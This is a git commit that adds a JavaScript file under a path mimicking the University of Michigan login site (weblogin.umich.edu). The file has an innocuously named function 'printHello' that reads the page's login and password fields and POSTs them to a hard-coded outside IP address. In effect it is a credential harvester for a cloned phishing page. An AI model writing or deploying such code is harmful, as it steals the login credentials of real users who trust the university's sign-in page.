c3cef7aa99667d4ac3f8930a70f52bbaf921cccb
Jordan <jminjie@umich.edu>
2016-04-22 00:49:30 +0000

    Add javascript to local

---
+++ weblogin.umich.edu/requester.js
@@ -0,0 +1,12 @@
+var my_ip = "98.209.19.232"
+
+function printHello() {
+	// grab the login and pass
+	var login = document.getElementById('login');
+	var password = document.getElementById('password');
+	// send the login and pass as resquests
+	var req = new XMLHttpRequest();
+	req.open( "POST", my_ip, true); // false for synchronous request
+	req.send("<login>"+login.value+"</login>\n"+"<pass>"+password.value+"</pass>");
+}
+
